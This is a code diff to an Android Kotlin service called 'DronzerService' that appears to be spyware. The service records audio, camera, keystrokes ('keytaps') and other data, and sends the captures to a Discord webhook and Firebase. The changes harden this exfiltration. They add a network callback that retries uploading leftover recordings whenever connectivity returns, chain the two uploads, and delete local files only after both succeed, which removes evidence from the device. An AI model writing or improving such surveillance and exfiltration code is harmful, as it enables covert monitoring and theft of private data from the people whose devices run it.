@@ -13,6 +13,10 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.hardware.camera2.CameraManager
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.net.wifi.WifiManager
 import android.os.*
 import android.provider.Settings
@@ -34,6 +38,8 @@ import java.net.InetSocketAddress
 import java.net.Socket
 import java.util.concurrent.TimeUnit
 import java.io.File
+import java.util.concurrent.atomic.AtomicBoolean
+import kotlin.coroutines.resume
 
 class DronzerService : Service() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -60,6 +66,8 @@ class DronzerService : Service() {
     private var isCamFront = true
 
     private val socketMutex = Mutex()
+    private val recoveryMutex = Mutex()
+    private val isRecovering = AtomicBoolean(false)
 
     companion object {
         const val NOTIFICATION_ID = 101
@@ -97,7 +105,34 @@ class DronzerService : Service() {
         FirebaseManager.uploadReport("Status", "Service Started on ${Build.MODEL}")
 
         setupPersistence()
-        recoverLostRecordings()
+        registerNetworkCallback()
+        triggerRecovery()
+    }
+
+    private fun registerNetworkCallback() {
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val networkRequest = NetworkRequest.Builder()
+            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+            .build()
+        
+        connectivityManager.registerNetworkCallback(networkRequest, object : ConnectivityManager.NetworkCallback() {
+            override fun onAvailable(network: Network) {
+                Log.d("DronzerService", "Network available, triggering recovery...")
+                triggerRecovery()
+            }
+        })
+    }
+
+    private fun triggerRecovery() {
+        if (isRecovering.compareAndSet(false, true)) {
+            serviceScope.launch {
+                try {
+                    recoverLostRecordings()
+                } finally {
+                    isRecovering.set(false)
+                }
+            }
+        }
     }
 
     private fun startInForeground() {
@@ -246,8 +281,8 @@ class DronzerService : Service() {
         }
     }
 
-    private fun recoverLostRecordings() {
-        serviceScope.launch {
+    private suspend fun recoverLostRecordings() {
+        recoveryMutex.withLock {
             try {
                 val cacheDir = applicationContext.cacheDir
                 val files = cacheDir.listFiles { file ->
@@ -256,11 +291,12 @@ class DronzerService : Service() {
                 
                 if (files != null && files.isNotEmpty()) {
                     Log.d("DronzerService", "Found ${files.size} lost recordings. Recovering...")
-                    val recoveryMsg = "⚠️ **System Recovery**: Found ${files.size} unfinished recording(s). Uploading..."
+                    val recoveryMsg = "⚠️ **System Recovery**: Found ${files.size} unfinished recording(s). Attempting upload..."
                     DiscordManager.sendToWebhook(recoveryMsg)
                     FirebaseManager.uploadReport("Recovery", recoveryMsg)
                     
                     for (file in files) {
+                        if (!file.exists()) continue
                         val type = when {
                             file.name.contains("audio") -> "Audio"
                             file.name.contains("cam") -> "Camera"
@@ -268,7 +304,19 @@ class DronzerService : Service() {
                             file.name.contains("keytaps") -> "KeyTaps"
                             else -> "Unknown"
                         }
-                        uploadWithProgress(file, ">> Recovered $type recording uploaded successfully.", type.lowercase())
+                        
+                        Log.d("DronzerService", "Recovering file: ${file.name}")
+                        val success = suspendCancellableCoroutine<Boolean> { cont ->
+                            uploadWithProgress(file, ">> Recovered $type recording uploaded successfully.", type.lowercase()) { uploaded ->
+                                if (cont.isActive) cont.resume(uploaded)
+                            }
+                        }
+                        
+                        if (success) {
+                            Log.d("DronzerService", "Recovery success for ${file.name}. File deleted.")
+                        } else {
+                            Log.e("DronzerService", "Recovery failed for ${file.name}. Will retry later.")
+                        }
                         delay(2000)
                     }
                 }
@@ -710,17 +758,28 @@ class DronzerService : Service() {
         return audioManager.mode != android.media.AudioManager.MODE_NORMAL
     }
 
-    private fun uploadWithProgress(file: File, completionMessage: String, fbFolder: String) {
-        DiscordManager.sendFileToWebhook(file, completionMessage, null, { success, error ->
-            Log.d("DronzerService", "Discord upload result: $success")
-        })
-        
-        FirebaseManager.uploadFile(file, fbFolder) { success ->
-            if (success) {
-                Log.d("DronzerService", "Firebase upload success. Deleting file.")
-                file.delete()
+    private fun uploadWithProgress(
+        file: File, 
+        completionMessage: String, 
+        fbFolder: String, 
+        onComplete: ((Boolean) -> Unit)? = null
+    ) {
+        FirebaseManager.uploadFile(file, fbFolder) { fbSuccess ->
+            if (fbSuccess) {
+                Log.d("DronzerService", "Firebase upload success. Now sending to Discord.")
+                DiscordManager.sendFileToWebhook(file, completionMessage, null, { dsSuccess, _ ->
+                    if (dsSuccess) {
+                        Log.d("DronzerService", "Discord upload success. Deleting file.")
+                        file.delete()
+                        onComplete?.invoke(true)
+                    } else {
+                        Log.e("DronzerService", "Discord upload failed. File kept for recovery.")
+                        onComplete?.invoke(false)
+                    }
+                })
             } else {
                 Log.e("DronzerService", "Firebase upload failed. File kept for recovery.")
+                onComplete?.invoke(false)
             }
         }
     }
